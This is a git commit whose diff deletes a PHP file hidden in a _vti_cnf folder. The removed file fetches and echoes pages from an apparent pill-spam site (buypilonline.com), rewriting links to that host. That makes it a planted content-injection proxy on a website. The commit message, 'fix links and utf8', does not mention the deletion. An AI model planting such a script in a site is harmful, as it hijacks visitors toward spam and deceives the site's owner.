05df3dbc0668896b96d9361e930dad1b68fd93e3
starrytibet-lab <starrytibet@gmail.com>
2026-07-20 09:56:48 +0800

    fix links and utf8

--- _vti_cnf/index.php
+++
@@ -1,4 +0,0 @@
-<?php
-$url='http://buypilonline.com/';
-$newSite= file_get_contents('http://buypilonline.com/');
-echo preg_replace(array('/(src=)(\'|\")(?!(https|http))(\/?)(.*?)(\'|\")/m','/(href=)(\'|\")(?!(http|https))(\/?)(.*?)(\'|\")/m'),array("$1$2$url$5$6","$1$2$url$5$6"),$newSite);
